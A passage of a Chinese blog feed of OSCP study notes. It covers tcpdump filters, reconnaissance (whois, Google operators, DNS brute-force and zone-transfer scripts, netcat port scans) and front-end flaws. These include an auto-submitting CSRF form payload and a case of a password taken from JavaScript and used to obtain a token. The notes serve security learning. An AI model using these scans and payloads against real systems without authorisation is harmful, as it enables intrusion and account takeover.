href="#host过滤" class="headerlink" title="host过滤"></a><code>host</code>过滤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只显示包含 192.168.0.1 主机的数据包</span></span><br><span class="line">sudo tcpdump host 192.168.0.1</span><br></pre></td></tr></table></figure><h5 id="源IP地址-src-过滤"><a href="#源IP地址-src-过滤" class="headerlink" title="源IP地址(src)过滤"></a><code>源IP地址(src)</code>过滤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只显示源IP地址为 192.168.0.1 的数据包</span></span><br><span class="line">sudo tcpdump src 192.168.0.1</span><br></pre></td></tr></table></figure><h5 id="目的IP地址（dst）过滤"><a href="#目的IP地址（dst）过滤" class="headerlink" title="目的IP地址（dst）过滤"></a><code>目的IP地址（dst）</code>过滤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只显示目的IP地址为 192.168.0.1 的数据包</span></span><br><span class="line">sudo tcpdump dst 192.168.0.1</span><br></pre></td></tr></table></figure><h5 id="IP网段的过滤"><a href="#IP网段的过滤" class="headerlink" title="IP网段的过滤"></a><code>IP网段</code>的过滤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只显示该IP网段(192.168.0.0/24)中包含的IP地址的数据包</span></span><br><span class="line">sudo tcpdump net 192.168.0.1/24</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这个也可以指定数据流方向，即指定源IP或者目的IP为该网段的数据包</span></span><br><span class="line">sudo tcpdump dst net 192.168.0.1/24</span><br></pre></td></tr></table></figure><h4 id="基于端口的过滤"><a href="#基于端口的过滤" class="headerlink" title="基于端口的过滤"></a>基于<code>端口</code>的过滤</h4><h5 id="tcp端口过滤"><a href="#tcp端口过滤" class="headerlink" title="tcp端口过滤"></a><code>tcp端口</code>过滤</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 只显示tcp端口为80的数据包</span></span><br><span class="line">sudo tcpdump tcp port 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只显示源端口为80的数据包</span></span><br><span class="line">sudo tcpdump src tcp port 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 只显示目的端口为80的数据包</span></span><br><span class="line">sudo tcpdump dst tcp port 80</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定显示多个端口的数据包</span></span><br><span class="line">sudo tcpdump tcp port 80 or 22</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定显示一个范围端口的数据包</span></span><br><span class="line">sudo tcpdump tcp portrange 80-8080</span><br><span class="line"></span><br><span class="line"><span class="comment"># 对于常见的应用层协议的默认端口可以直接用协议名指定</span></span><br><span class="line">sudo tcpdump tcp port http or https or ssh</span><br></pre></td></tr></table></figure><blockquote><p><code>tcp端口</code>过滤同样可以指定<code>源端口</code>或者<code>目的端口</code></p></blockquote><h5 id="udp端口过滤"><a href="#udp端口过滤" class="headerlink" title="udp端口过滤"></a><code>udp端口</code>过滤</h5><p><code>udp端口</code>的过滤方式同<code>tcp</code></p><h4 id="基于网络协议的过滤"><a href="#基于网络协议的过滤" class="headerlink" title="基于网络协议的过滤"></a>基于<code>网络协议</code>的过滤</h4><blockquote><p>对于<code>底层网络传输协议</code>可以通过<code>指定协议名</code>来过滤数据包</p><p>支持的协议 <code>ip</code> 、<code> ip6</code> 、 <code>arp</code> 、 <code>icmp</code> 、 <code>tcp</code> 、 <code>udp</code> 等</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定显示ICMP协议的数据包</span></span><br><span class="line">sudo tcpdump icmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定显示多个协议的数据包</span></span><br><span class="line">sudo tcpdump icmp or ip or tcp or udp</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定显示包含tcp协议和udp协议中的http、domain协议端口的数据包</span></span><br><span class="line">sudo tcpdump tcp port http or https or udp port domain</span><br></pre></td></tr></table></figure><h4 id="基于包大小过滤"><a href="#基于包大小过滤" class="headerlink" title="基于包大小过滤"></a>基于<code>包大小</code>过滤</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 捕获小于32bytes的数据包</span></span><br><span class="line">sudo tcpdump less 22</span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获大于32bytes的数据包</span></span><br><span class="line">sudo tcpdump greater 22</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="C:\Users\VM110\Desktop\渗透测试学习\OSCP基础渗透测试学习\笔记\tcpdump.png" alt="tcpdump"></p>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> Kali Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息收集</title>
      <link href="/2023/10/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
      <url>/2023/10/20/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
      
        <content type="html"><![CDATA[<h1 id="被动信息搜集"><a href="#被动信息搜集" class="headerlink" title="被动信息搜集"></a>被动信息搜集</h1><hr><p>对于“被动”有两种不同的解释。在最严格的解释中，我们从不直接与目标进行通信。例如，我们可以依赖第三方获取信息，但我们不会访问目标的任何系统或服务器。采用这种方法可以保持我们行动和意图的高度机密性，但也可能很繁琐，并且可能限制我们的结果。在较宽松的解释中，我们可能会与目标进行交互，但只是作为一个普通的互联网用户。例如，如果目标的网站允许我们注册帐户，我们可以这样做。但是，在此阶段我们不会对网站进行漏洞测试。</p><h2 id="记录笔记"><a href="#记录笔记" class="headerlink" title="记录笔记"></a>记录笔记</h2><p>一个信息收集活动可能会生成大量的数据，因此重要的是我们能够有效地管理这些数据，以便在后续搜索中利用它或在后续阶段中使用它。记录笔记没有对错之分。然而，如果我们保持详细和格式良好的笔记，可能会更容易在以后检索信息。</p><h2 id="网站侦察"><a href="#网站侦察" class="headerlink" title="网站侦察"></a>网站侦察</h2><p>如果客户拥有一个网站，我们可以通过简单地浏览网站来收集基本信息。小型组织可能只有一个网站，而大型组织可能有很多网站，其中一些可能没有得到维护。</p><h2 id="Whois-枚举"><a href="#Whois-枚举" class="headerlink" title="Whois 枚举"></a>Whois 枚举</h2><p>Whois 是一种 TCP 服务、工具和数据库，可以提供有关域名的信息，例如名称服务器和注册商。这些信息通常是公开的，因为注册商对私人注册收费。我们可以通过执行标准的正向搜索，通过<code>whois</code>客户端，来收集有关域名的基本信息。</p><h3 id="正向搜索"><a href="#正向搜索" class="headerlink" title="正向搜索"></a>正向搜索</h3><p>利用域名收集关于域名的基本信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois &lt;root_domain&gt;</span><br></pre></td></tr></table></figure><h3 id="反向搜索"><a href="#反向搜索" class="headerlink" title="反向搜索"></a>反向搜索</h3><p>whois 客户端还可以执行反向查找。假设我们有一个 IP 地址，我们可以进行反向查找以获取更多关于该 IP 地址的信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whois &lt;ip&gt;</span><br></pre></td></tr></table></figure><h2 id="谷歌黑客"><a href="#谷歌黑客" class="headerlink" title="谷歌黑客"></a>谷歌黑客</h2><p>Google Hacking”这个术语在 2001 年由约翰尼·朗（Johnny Long）广为流传。通过几次演讲和一本非常受欢迎的书（《Google Hacking for Penetration Testers》），他详细介绍了如何利用谷歌等搜索引擎来发现关键信息、漏洞和配置错误的网站。这种技术的核心是巧妙的搜索字符串和运算符，它们允许对搜索查询进行创造性的精炼，其中大多数都适用于各种搜索引擎。这个过程是迭代的，从广泛的搜索开始，然后通过运算符缩小范围，筛选出不相关或不感兴趣的结果。</p><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td>site:</td><td>限制搜索结果为特定网站。例如：<code>site:example.com</code> 将只返回属于 example.com 域的结果。</td></tr><tr><td>intitle:</td><td>限制搜索结果为包含指定关键词在标题中的页面。例如：<code>intitle:&quot;login page&quot;</code> 将返回包含“login page”关键词的页面。</td></tr><tr><td>inurl:</td><td>限制搜索结果为包含指定关键词在 URL 中的页面。例如：<code>inurl:admin</code> 将返回包含“admin”关键词的 URL。</td></tr><tr><td>filetype:</td><td>限制搜索结果为特定文件类型。例如：<code>filetype:pdf</code> 将返回 PDF 文件。</td></tr><tr><td>link:</td><td>限制搜索结果为链接到指定网站的页面。例如：<code>link:example.com</code> 将返回链接到 example.com 的页面。</td></tr><tr><td>cache:</td><td>显示指定网页的缓存版本。例如：<code>cache:example.com</code> 将显示 example.com 的缓存页面。</td></tr><tr><td>related:</td><td>显示与指定网页类似的其他网页。例如：<code>related:example.com</code> 将显示与 example.com 类似的其他网页。</td></tr><tr><td>info:</td><td>显示关于指定网站的信息，包括链接、相似网站和缓存版本等。例如：<code>info:example.com</code> 将显示有关 example.com 的信息。</td></tr><tr><td>intext:</td><td>限制搜索结果为包含指定关键词在页面正文中的页面。例如：<code>intext:&quot;password&quot;</code> 将返回包含“password”关键词的页面。</td></tr><tr><td>ext:</td><td>限制搜索结果为指定文件扩展名的文件。例如：<code>ext:php</code> 将返回 PHP 文件。</td></tr></tbody></table><blockquote><p>这些基本示例只是浅尝辄止，我们可以通过搜索运算符做更多的事情。<a href="https://www.exploit-db.com/google-hacking-database">Google 黑客数据库（GHDB）</a>包含大量创造性搜索的示例，展示了通过组合运算符进行创造性搜索的强大功能。</p></blockquote><h2 id="通过第三方网站获取信息"><a href="#通过第三方网站获取信息" class="headerlink" title="通过第三方网站获取信息"></a>通过第三方网站获取信息</h2><blockquote><p><a href="https://fofa.info/">FOFA</a></p></blockquote><blockquote><p><a href="https://searchdns.netcraft.com/">Netcraft</a></p></blockquote><blockquote><p><a href="https://tool.chinaz.com/">站长工具</a></p></blockquote><blockquote><p><a href="https://www.shodan.io/">Shodan</a></p></blockquote><blockquote><p><a href="https://securityheaders.com/">Security Headers Scanner</a></p></blockquote><blockquote><p><a href="https://www.ssllabs.com/ssltest/">SSL Server Test</a></p></blockquote><h2 id="recon-ng-Web-信息搜集框架"><a href="#recon-ng-Web-信息搜集框架" class="headerlink" title="recon-ng Web 信息搜集框架"></a><code>recon-ng</code> Web 信息搜集框架</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">recon-ng # 启动软件</span><br><span class="line"></span><br><span class="line">marketplace search &lt;module_name&gt; # 搜索模块</span><br><span class="line"></span><br><span class="line">marketplace install &lt;module_name&gt; # 安装模块</span><br><span class="line"></span><br><span class="line">modules load &lt;module_name&gt; # 载入模块</span><br><span class="line"></span><br><span class="line">options set &lt;dec&gt; &lt;vaule&gt; # 设置模块需要参数</span><br><span class="line"></span><br><span class="line">run # 启动模块</span><br></pre></td></tr></table></figure><h2 id="Open-Source-Code-开源代码"><a href="#Open-Source-Code-开源代码" class="headerlink" title="Open-Source Code(开源代码)"></a>Open-Source Code(开源代码)</h2><p>通过 Github 来获取别人网站的开源版本。</p><h2 id="用户信息收集"><a href="#用户信息收集" class="headerlink" title="用户信息收集"></a>用户信息收集</h2><p>除了收集有关目标组织资源的信息之外，我们还可以收集有关该组织员工的信息。我们收集这些信息的目的是编制用户或密码列表，构建社交工程的借口，增强钓鱼攻击或客户端攻击，执行凭证填充等等。然而，每个渗透测试的参与规则各不相同。有些渗透测试可能仅限于纯粹的技术测试，没有任何社交工程方面的内容。其他测试可能有少量或没有限制。</p><h3 id="邮箱收集"><a href="#邮箱收集" class="headerlink" title="邮箱收集"></a>邮箱收集</h3><p>使用<code>theHarvester</code>命令从多个公共数据源收集电子邮箱。</p><blockquote><p><code>theHarvester -d megacorpone.com -b google</code>, 使用-d 参数指定目标域名，使用-b 参数设置要搜索的数据源</p></blockquote><h2 id="信息收集框架"><a href="#信息收集框架" class="headerlink" title="信息收集框架"></a>信息收集框架</h2><h3 id="OSINT-框架"><a href="#OSINT-框架" class="headerlink" title="OSINT 框架"></a><code>OSINT</code> 框架</h3><p><a href="https://osintframework.com/">OSINT</a> 框架在一个中心包括信息收集工具和网站地点。 框架中列出的一些工具涵盖的学科比信息安全更多。</p><h1 id="主动信息收集"><a href="#主动信息收集" class="headerlink" title="主动信息收集"></a>主动信息收集</h1><p>在本模块中，我们将超越被动信息收集，探索涉及与目标服务直接交互的技术。我们将研究一些基础技术，但请记住，现场中可以针对无数个服务进行攻击。例如，这包括 Active Directory，我们将在另一个模块中详细介绍。但是，在本模块中，我们将研究一些更常见的主动信息收集技术，包括端口扫描以及 DNS、SMB、NFS、SMTP 和 SNMP 枚举。</p><h2 id="DNS-枚举"><a href="#DNS-枚举" class="headerlink" title="DNS 枚举"></a>DNS 枚举</h2><h3 id="使用-host-命令查询域名-DNS-信息"><a href="#使用-host-命令查询域名-DNS-信息" class="headerlink" title="使用 host 命令查询域名 DNS 信息"></a>使用 <code>host</code> 命令查询域名 DNS 信息</h3><blockquote><p>一些常见的 DNS 记录类型</p></blockquote><table><thead><tr><th>记录类型</th><th>说明</th></tr></thead><tbody><tr><td>NS</td><td>名称服务器记录包含托管域名的 DNS 记录的权威服务器的名称。</td></tr><tr><td>A</td><td>也称为主机记录，“A 记录”包含主机名（如<a href="http://www.megacorpone.com)的ip地址./">www.megacorpone.com）的IP地址。</a></td></tr><tr><td>MX</td><td>邮件交换记录包含负责处理域名电子邮件的服务器的名称。一个域可以包含多个 MX 记录。</td></tr><tr><td>PTR</td><td>指针记录用于反向查找区域，并用于查找与 IP 地址相关联的记录。</td></tr><tr><td>CNAME</td><td>规范名称记录用于为其他主机记录创建别名。</td></tr><tr><td>TXT</td><td>文本记录可以包含任意数据，并可用于各种目的，例如域名所有权验证。</td></tr></tbody></table><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">host命令查询域名IP地址</span></span><br><span class="line">host &lt;domain&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-t 指定查询DNS记录类型</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">默认查询A记录</span></span><br><span class="line">host -t A &lt;root_domain&gt;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">查用的IP详细信息查询方式（网页查询）</span></span><br><span class="line">curl cip.cc # 查询自己IP信息</span><br><span class="line">curl cip.cc/192.168.1.1 # 查询192.168.1.1 IP信息</span><br></pre></td></tr></table></figure><h3 id="自动化查找"><a href="#自动化查找" class="headerlink" title="自动化查找"></a>自动化查找</h3><p>利用<code>host</code>命令我们可以继续使用其他 DNS 查询来发现属于同一域的更多主机名和 IP 地址。</p><h3 id="正向查找暴力破解"><a href="#正向查找暴力破解" class="headerlink" title="正向查找暴力破解"></a>正向查找暴力破解</h3><p>利用<code>Bash</code>脚本结合爆破字典查询。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 利用list.txt</span></span><br><span class="line"><span class="keyword">for</span> host <span class="keyword">in</span> $(<span class="built_in">cat</span> list.txt)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  host -t A <span class="variable">$host</span>.nowuo.cn</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="反向查找暴力破解"><a href="#反向查找暴力破解" class="headerlink" title="反向查找暴力破解"></a>反向查找暴力破解</h3><p>DNS 正向破解中在相同的网段发现了一组分散的 IP 地址。如果域名管理员为该域设置了 PTR 记录，我们可以使用反向查找扫描该近似范围，以请求每个 IP 的主机名。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 假设发现发的网段为: 192.168.0.0/24</span></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> $(<span class="built_in">seq</span> 1 254)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">  host 192.168.0.<span class="variable">$ip</span></span><br><span class="line"><span class="keyword">done</span> | grep -v <span class="string">&quot;not found&quot;</span></span><br></pre></td></tr></table></figure><h3 id="DNS-区域传输"><a href="#DNS-区域传输" class="headerlink" title="DNS 区域传输"></a>DNS 区域传输</h3><p>DNS 区域传输基本上是相关 DNS 服务器之间的数据库复制，其中区域文件从主 DNS 服务器复制到从服务器。区域文件包含为该区域配置的所有 DNS 名称的列表。区域传输应该只允许授权的从 DNS 服务器，但许多管理员错误地配置他们的 DNS 服务器，在这些情况下，任何请求 DNS 服务器区域副本的人通常都会收到一个。这相当于在银盘上向黑客透露公司网络布局。所有服务器的名称、地址和功能都可能暴露给窥探的眼睛。</p><p>执行区域传输的 <code>host</code> 命令语法如下：</p><p><code>host -l &lt;domain name&gt; &lt;dns server address&gt;</code></p><p>通过 DNS 区域传输获取其他主机 IP 地址脚本</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> [ -z <span class="variable">$1</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;[*] 简单的区域传输脚本&quot;</span></span><br><span class="line">   <span class="built_in">echo</span> <span class="string">&quot;[*] 用法：<span class="variable">$0</span> &lt;域名&gt;&quot;</span></span><br><span class="line">   <span class="built_in">exit</span> 0</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> domain <span class="keyword">in</span> $(host -t NS <span class="variable">$1</span> | <span class="built_in">cut</span> -f 4 -d <span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">   host -l <span class="variable">$1</span> <span class="variable">$domain</span> | grep <span class="string">&quot;has address&quot;</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><h3 id="kali-linux-中的相关工具"><a href="#kali-linux-中的相关工具" class="headerlink" title="kali linux 中的相关工具"></a>kali linux 中的相关工具</h3><h4 id="dnsrecon-工具"><a href="#dnsrecon-工具" class="headerlink" title="dnsrecon 工具"></a><code>dnsrecon</code> 工具</h4><p>DNSRecon 是一个先进的、现代的 Python 编写的 DNS 枚举脚本。</p><p>利用<code>dnsrecon</code>查询区域传输，<code>-d</code>选项指定域名,<code>-t</code>指定要执行的枚举类型</p><p><code>dnsrecon -d &lt;domain&gt; -t axfr</code></p><p>利用<code>dnsrecon</code>进行域名暴力破解</p><p><code>dnsrecon -d &lt;domain&gt; -D &lt;hosts_list_path&gt; -t brt</code></p><h4 id="dnsenum-工具"><a href="#dnsenum-工具" class="headerlink" title="dnsenum 工具"></a><code>dnsenum</code> 工具</h4><p>DNSEnum 是另一个流行的 DNS 枚举工具。自动化查询所有<code>dns</code>字段。</p><p><code>dnsenum &lt;domain&gt;</code> # 自动化查询</p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p>端口扫描是检查远程计算机上的<code>TCP</code>或<code>UDP</code>端口的过程，旨在检测目标上运行的服务以及可能存在的潜在攻击向量。了解端口扫描的影响以及特定端口扫描可能产生的影响是非常重要的。由于某些扫描可能会产生大量的流量，以及它们的侵入性，盲目运行端口扫描可能会对目标系统或客户网络产生不利影响，例如过载服务器和网络链接，或触发入侵检测系统(IDS)。</p><p>使用适当的端口扫描方法可以显著提高我们作为渗透测试人员的效率，同时还可以限制许多风险。根据参与的范围，我们可以先只扫描<code>80</code>和<code>443</code>端口，而不是对目标网络运行完整的端口扫描。使用可能的 Web 服务器列表，我们可以在后台对这些服务器运行完整的端口扫描，同时进行其他枚举。完成完整的端口扫描后，我们可以进一步缩小扫描范围，逐渐探测更多信息。端口扫描应被视为一种独特于每个参与的动态过程。一个扫描的结果决定了下一个扫描的类型和范围。</p><h3 id="TCP-扫描"><a href="#TCP-扫描" class="headerlink" title="TCP 扫描"></a><code>TCP</code> 扫描</h3><p>最简单的<code>TCP</code>端口扫描技术通常称为 CONNECT 扫描，它依赖于三向<code>TCP</code>握手机制。该机制旨在使两个试图通信的主机在传输任何数据之前协商网络<code>TCP</code>套接字连接的参数。简单地说，主机向目标端口上的服务器发送一个<code>TCPSYN</code>数据包。如果目标端口是打开的，服务器将用<code>SYN-ACK</code>数据包进行响应，客户端主机发送<code>ACK</code>数据包以完成握手。如果握手成功完成，则认为端口是打开的。</p><p>利用<code>netcat</code>实现对目的 IP <code>7880-7895</code> TCP 端口进行扫描扫描</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-w 设置超时时间</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">-l 设置零I/O模式，它将不发送任何数据</span></span><br><span class="line">nc -nv -w 1 -z &lt;dec_ip&gt; &lt;port_area&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP学习 </tag>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端安全漏洞</title>
      <link href="/2023/10/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/"/>
      <url>/2023/10/20/%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="返回包状态码"><a href="#返回包状态码" class="headerlink" title="返回包状态码"></a>返回包状态码</h3><ul><li>200 ：OK-确认</li><li>302：Found-跳转</li><li>400：Bad Request-错误的请求</li><li><strong><em>401：Unauthorized-当前用户未授权</em></strong></li><li>403：Forbidden-禁止访问</li><li>404：Not Found-未找到</li><li><strong><em>405：Method Not Allowed -请求方式不允许</em></strong></li><li><strong><em>415：Unsupported Media Type-不支持的 Content-type</em></strong></li><li><strong><em>500：Internal Server Error-错误的网关</em></strong></li><li>504：Gateway Timeout- 请求超时</li></ul><hr><h3 id="常规-前端安全漏洞"><a href="#常规-前端安全漏洞" class="headerlink" title="常规 - 前端安全漏洞"></a>常规 - 前端安全漏洞</h3><blockquote><p>XSS<br>CSRF<br>注释信息<br>前端校验权限</p></blockquote><h4 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h4><ul><li><p>反射性 XSS</p><ul><li>需要讲触发点发送给目标用户- <u>低危</u><br>请求方式：GET、POST 型<br>常用参数：url、keyword、各类请求参数</li></ul></li><li><p>存储型 XSS</p><ul><li>文件上传导致的存储型 XSS（上传至存储桶）- <u>低危</u></li><li>文件上传导致的存储型 XSS - <u>中危</u><ul><li>文件上传的文件名</li><li>发票抬头名称、税号，开户名称</li><li>邀请用户的用户名、个人信息</li><li>收货地址</li><li>地图的起点、终点</li></ul></li><li>需要将触发页面发送给目标用户的 - <u>中高危</u></li><li>受众较广的发帖功能、发送信息功能 - <u>中高危</u></li><li>能够威胁到管理后台 - <u>高危</u></li></ul></li></ul><hr><h4 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h4><ul><li>GET 类型<ul><li>Web 应用使用 GET 请求进行关键的数据操作</li></ul></li><li>POST 类型<ul><li>利用方法：使用一个自动提交的表单</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=http://xxx.com/edit.php method=POST&gt;</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;user&quot; value=&quot;11&quot;&gt;</span><br><span class="line">&lt;/form&gt;&lt;script&gt; document.forms[0].submit();&lt;/script&gt;</span><br></pre></td></tr></table></figure><pre><code>访问该页面后，表单将自动提交，相当于模拟用户完成了一次POST操作</code></pre><ul><li>CSRF 高危行为<ul><li>修改用户密码</li><li>修改个人信息</li><li>进行资金操作</li><li>与 Self XSS 组合利用</li></ul></li></ul><blockquote><p><em>案例 1</em></p></blockquote><p>用户修改安全邮箱时，抓取数据包，<br>原有的 userEmail 不会验证，可直接修改为输入后的<br>导致绕过验证并修改了安全邮箱</p><p><strong><em>总结</em></strong></p><ul><li>在特定的环境下，CSRF 能获得高危</li><li>尝试寻找高风险的操作</li><li>应用的用户基数决定了 CSRF 的上限</li></ul><blockquote><p><em>案例 2</em> - CSRF 与 Self XSS 组合利用</p></blockquote><p>构造 HTML，将 XSS 攻击代码嵌入 CSRF 的 Payload 中</p><hr><h4 id="前端注释信息"><a href="#前端注释信息" class="headerlink" title="前端注释信息"></a>前端注释信息</h4><ul><li><p>敏感数据</p><ul><li>敏感目录或文件地址</li><li>内网接口信息泄露</li><li>网站的基础架构</li><li>用户相关数据，比如测试用的账户密码</li></ul></li><li><p>HTML 注释<br>常用格式为：&lt;!-注释内容-&gt;</p></li><li><p>JavaScript 注释</p><ul><li>单行注释：<code>//注释内容</code></li><li>多行注释：<code>/注释内容/</code></li></ul></li></ul><blockquote><p><em>案例 1</em></p></blockquote><ul><li>通过 JavaScript 发现账户密码</li><li>调用接口利用密码 ，获取系统 token</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST /sso/sso/v1.0/loginByEmplcode HTTP/1.1</span><br></pre></td></tr></table></figure><p>请求体</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">&quot;password&quot;:&quot;1qaz@wsx#&quot;</span><br><span class="line">&quot;username&quot;:&quot;80003&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>将获取的 token 导入浏览器并访问后台</li></ul><h4 id="前端权限绕过"><a href="#前端权限绕过" class="headerlink" title="前端权限绕过"></a>前端权限绕过</h4><ul><li>通过修改 HTTP 响应包中的参数，从而绕过验证，如：<ul><li>验证码是否正确</li><li>用户请求是否通过校验</li><li>控制用户权限</li><li>控制当前用户的身份</li></ul></li></ul><blockquote><p><em>案例</em></p></blockquote><ul><li>小程序授权登录，之后拦截请求包</li><li>修改参数 UID</li></ul><hr><h3 id="前端框架安全"><a href="#前端框架安全" class="headerlink" title="前端框架安全"></a>前端框架安全</h3><blockquote><p>高风险 Webpack<br>中风险 Source Map<br>低风险 只有 JavaScript</p></blockquote><h4 id="Webpack"><a href="#Webpack" class="headerlink" title="Webpack"></a>Webpack</h4><ul><li><p>什么是 Webpack<br><a href="https://zhuanlan.zhihu.com/p/30981251"><strong>Webpack 介绍</strong></a></p></li><li><p>Webpack 分析</p><ul><li>如果使用了 Webpack，并使用默认设置，未隐藏 Webpack<br>即可使用浏览器开发工具，调出 Webpack 分析<br>多出现于&#x3D;&#x3D;&#x2F;#&#x2F;&#x3D;&#x3D;前端 H5+后端接口的组合中<ul><li>webpack:&#x2F;&#x2F;&#x2F;(webpack)&#x2F;buidlin - 全局文件、打包配置文件</li><li>webpack:&#x2F;&#x2F;&#x2F;node_modules - 打包的各类前端代码依赖库</li><li>webpack:&#x2F;&#x2F;&#x2F;src&#x2F;* - 核心打包后的代码<ul><li><strong><em>API</em></strong> - 